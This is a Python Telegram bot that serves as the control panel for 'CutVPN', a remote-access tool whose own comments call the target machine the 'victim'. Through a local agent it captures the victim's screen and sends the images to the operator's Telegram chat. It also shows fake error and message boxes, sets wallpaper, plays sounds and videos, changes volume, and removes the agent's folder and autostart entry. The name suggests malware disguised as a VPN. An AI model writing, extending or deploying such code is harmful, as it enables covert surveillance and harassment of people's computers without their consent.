"""
CutVPN Telegram Bot
===================
Управляет жертвой через локальный CutVPN Agent (127.0.0.1:8765).

Переменные окружения (обязательные):
  BOT_TOKEN          — токен от @BotFather
  CUTVPN_CHAT_ID     — ваш Telegram chat_id (только вы получите доступ)
  CUTVPN_AGENT_SECRET — должен совпадать с agent.json -> auth

Опциональные:
  CUTVPN_AGENT_URL   — по умолчанию http://127.0.0.1:8765

Запуск:
  pip install python-telegram-bot requests
  python bot.py
"""

from __future__ import annotations
import io
import logging
import os
import base64
import requests
from telegram import (
    Bot, InlineKeyboardButton, InlineKeyboardMarkup,
    InputMediaPhoto, Update,
)
from telegram.ext import (
    Application, CallbackQueryHandler,
    CommandHandler, ContextTypes, MessageHandler, filters,
)
from telegram.constants import ParseMode

# ─── Config ───────────────────────────────────────────────────────────────────
TOKEN        = os.environ["BOT_TOKEN"]
CHAT_ID      = int(os.environ["CUTVPN_CHAT_ID"])
AGENT_URL    = os.environ.get("CUTVPN_AGENT_URL", "http://127.0.0.1:8765")
AGENT_SECRET = os.environ.get("CUTVPN_AGENT_SECRET", "")

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("cutvpn-bot")

# ─── Agent client ─────────────────────────────────────────────────────────────
def agent(command: str, **kwargs) -> dict:
    """Отправить команду агенту. Возвращает dict с полями status / message."""
    body: dict = {"command": command}
    if AGENT_SECRET:
        body["secret"] = AGENT_SECRET
    body.update(kwargs)
    try:
        r = requests.post(f"{AGENT_URL}/command", json=body, timeout=15)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        return {"status": "error", "message": "❌ Агент не запущен или недоступен"}
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "❌ Агент не ответил (таймаут 15 сек)"}
    except Exception as e:
        return {"status": "error", "message": f"❌ {e}"}

def agent_health() -> bool:
    try:
        r = requests.get(f"{AGENT_URL}/health", timeout=5)
        return r.status_code == 200
    except Exception:
        return False

# ─── Auth guard ──────────────────────────────────────────────────────────────
def allowed(update: Update) -> bool:
    return bool(update.effective_chat and update.effective_chat.id == CHAT_ID)

# ─── Keyboards ────────────────────────────────────────────────────────────────
def kb_main() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("📊 Статус",      callback_data="status"),
            InlineKeyboardButton("ℹ️ Инфо",        callback_data="info"),
            InlineKeyboardButton("📸 Скриншот",    callback_data="screenshot"),
        ],
        [
            InlineKeyboardButton("🎭 Визуалы ВКЛ", callback_data="visuals_on"),
            InlineKeyboardButton("🛑 Визуалы ВЫКЛ",callback_data="visuals_off"),
        ],
        [
            InlineKeyboardButton("🔊 Громкость MAX",callback_data="volume_max"),
            InlineKeyboardButton("🔇 Mute",         callback_data="volume_mute"),
            InlineKeyboardButton("🔉 50%",           callback_data="volume_50"),
        ],
        [
            InlineKeyboardButton("💥 Случайная ошибка", callback_data="random_error"),
            InlineKeyboardButton("💬 Сообщение",         callback_data="msgbox_menu"),
        ],
        [
            InlineKeyboardButton("🖼 Обои (путь)",   callback_data="wallpaper_prompt"),
            InlineKeyboardButton("🎵 Звук (путь)",   callback_data="sound_prompt"),
            InlineKeyboardButton("🎬 Видео (путь)",  callback_data="video_prompt"),
        ],
        [
            InlineKeyboardButton("🔄 Перезапустить CutVPN", callback_data="restart"),
        ],
        [
            InlineKeyboardButton("🗑 УДАЛИТЬ CutVPN", callback_data="uninstall_confirm"),
        ],
    ])

def kb_confirm_uninstall() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Да, удалить",  callback_data="uninstall_go"),
        InlineKeyboardButton("❌ Отмена",        callback_data="back_main"),
    ]])

def kb_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("« Меню",  callback_data="back_main"),
    ]])

# ─── State: ожидание текста от пользователя ──────────────────────────────────
# ctx.user_data["await"] = "wallpaper" | "sound" | "video" | "msgbox_title" | "msgbox_text"

# ─── Handlers ────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not allowed(update): return
    online = "🟢 агент онлайн" if agent_health() else "🔴 агент недоступен"
    await update.message.reply_text(
        f"*CutVPN Control Panel* ({online})\n\nВыберите действие:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=kb_main(),
    )

async def on_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    q = update.callback_query
    if q is None: return
    await q.answer()
    if not allowed(update): return

    data = q.data or ""

    # ── Back / menu ──────────────────────────────────────────────────────────
    if data == "back_main":
        ctx.user_data.pop("await", None)
        ctx.user_data.pop("msgbox_title", None)
        await q.message.edit_text("Главное меню:", reply_markup=kb_main())
        return

    # ── Прямые команды ───────────────────────────────────────────────────────
    if data in ("status", "info", "visuals_on", "visuals_off",
                "restart", "volume_max", "volume_mute", "random_error"):
        cmd = data
        res = agent(cmd)
        text = _fmt(cmd, res)
        await q.message.edit_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb_main())
        return

    if data == "volume_50":
        res = agent("volume_set", level=50)
        await q.message.edit_text(_fmt("volume_set", res), parse_mode=ParseMode.MARKDOWN, reply_markup=kb_main())
        return

    # ── Скриншот ─────────────────────────────────────────────────────────────
    if data == "screenshot":
        await q.message.edit_text("📸 Делаю скриншот...", reply_markup=kb_back())
        res = agent("screenshot")
        if res.get("error"):
            await q.message.edit_text(f"❌ {res['message']}", reply_markup=kb_back())
            return
        b64 = res.get("base64")
        if b64:
            img_bytes = base64.b64decode(b64)
            await q.message.reply_photo(
                photo=io.BytesIO(img_bytes),
                caption=f"📸 Скриншот\n`{res.get('message','')}`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=kb_back(),
            )
            await q.message.delete()
        else:
            await q.message.edit_text(f"✅ {res['message']}", reply_markup=kb_back())
        return

    # ── Msgbox menu ──────────────────────────────────────────────────────────
    if data == "msgbox_menu":
        ctx.user_data["await"] = "msgbox_title"
        await q.message.edit_text(
            "💬 *Отправить сообщение на экран*\n\nВведите *заголовок* окна:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_back(),
        )
        return

    # ── Prompts для пути ─────────────────────────────────────────────────────
    if data == "wallpaper_prompt":
        ctx.user_data["await"] = "wallpaper"
        await q.message.edit_text(
            "🖼 Введите *полный путь* к изображению (jpg/png) на компьютере жертвы:\n\n"
            "Пример: `C:\\Users\\User\\Pictures\\photo.jpg`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_back(),
        )
        return

    if data == "sound_prompt":
        ctx.user_data["await"] = "sound"
        await q.message.edit_text(
            "🎵 Введите *полный путь* к аудиофайлу (wav) на компьютере жертвы:\n\n"
            "Пример: `C:\\Windows\\Media\\tada.wav`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_back(),
        )
        return

    if data == "video_prompt":
        ctx.user_data["await"] = "video"
        await q.message.edit_text(
            "🎬 Введите *полный путь* к видеофайлу на компьютере жертвы:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_back(),
        )
        return

    # ── Uninstall ─────────────────────────────────────────────────────────────
    if data == "uninstall_confirm":
        await q.message.edit_text(
            "⚠️ *Удалить CutVPN с компьютера?*\n\nЭто удалит папку CutVPN и автозапуск.",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_confirm_uninstall(),
        )
        return

    if data == "uninstall_go":
        res = agent("uninstall")
        await q.message.edit_text(
            f"🗑 *Удаление выполнено*\n\n{res.get('message', '?')}",
            parse_mode=ParseMode.MARKDOWN,
        )
        return


async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Обработка текстовых ответов пользователя (путь к файлу, текст окна)."""
    if not allowed(update) or not update.message: return
    text = (update.message.text or "").strip()
    state = ctx.user_data.get("await")

    if not state:
        # Нет ожидаемого ввода — показать меню
        await update.message.reply_text("Главное меню:", reply_markup=kb_main())
        return

    if state == "wallpaper":
        ctx.user_data.pop("await")
        res = agent("wallpaper_set", path=text)
        await update.message.reply_text(_fmt("wallpaper_set", res), parse_mode=ParseMode.MARKDOWN, reply_markup=kb_main())

    elif state == "sound":
        ctx.user_data.pop("await")
        res = agent("sound_play", path=text)
        await update.message.reply_text(_fmt("sound_play", res), parse_mode=ParseMode.MARKDOWN, reply_markup=kb_main())

    elif state == "video":
        ctx.user_data.pop("await")
        res = agent("video_play", path=text)
        await update.message.reply_text(_fmt("video_play", res), parse_mode=ParseMode.MARKDOWN, reply_markup=kb_main())

    elif state == "msgbox_title":
        ctx.user_data["await"] = "msgbox_text"
        ctx.user_data["msgbox_title"] = text
        await update.message.reply_text(
            f"💬 Заголовок: *{text}*\n\nТеперь введите *текст* сообщения:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_back(),
        )

    elif state == "msgbox_text":
        ctx.user_data.pop("await")
        title = ctx.user_data.pop("msgbox_title", "CutVPN")
        res = agent("msgbox", title=title, text=text, icon="Warning")
        await update.message.reply_text(
            f"💬 Окно показано!\n\n*{title}*: {text}",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=kb_main(),
        )


# ─── Format helper ────────────────────────────────────────────────────────────
EMOJI = {
    "status":      "📊",
    "info":        "ℹ️",
    "visuals_on":  "🎭",
    "visuals_off": "🛑",
    "restart":     "🔄",
    "volume_max":  "🔊",
    "volume_mute": "🔇",
    "volume_set":  "🔉",
    "random_error":"💥",
    "wallpaper_set":"🖼",
    "sound_play":  "🎵",
    "video_play":  "🎬",
    "msgbox":      "💬",
}

def _fmt(cmd: str, res: dict) -> str:
    em  = EMOJI.get(cmd, "✅")
    ok  = res.get("status", "ok") == "ok"
    msg = res.get("message", "")
    if ok:
        return f"{em} *{cmd}*\n\n{msg}"
    else:
        return f"❌ *{cmd}* — ошибка\n\n{msg}"


# ─── Main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu",  cmd_start))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    log.info("CutVPN bot started. Chat ID: %s", CHAT_ID)
    app.run_polling(drop_pending_updates=True)
